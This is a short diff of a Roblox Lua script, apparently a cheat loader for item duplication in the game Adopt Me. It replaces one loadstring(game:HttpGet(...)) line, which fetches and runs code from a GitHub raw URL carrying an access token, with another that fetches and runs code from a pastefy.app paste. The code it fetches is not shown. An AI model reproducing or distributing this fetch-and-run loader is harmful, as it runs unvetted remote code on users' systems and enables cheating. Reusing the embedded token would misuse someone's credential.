@@ -1,5 +1,5 @@
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/V3nomD3ath/AdoptMeDupe/refs/heads/main/FarmScript?token=GHSAT0AAAAAADF2MFAR2QHTFVWCUZ6MJ5B62DUT6JA",true))()
+loadstring(game:HttpGet("https://pastefy.app/WyY5oOgy/raw", true))()
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local ReplicatedFirst = game:GetService("ReplicatedFirst")
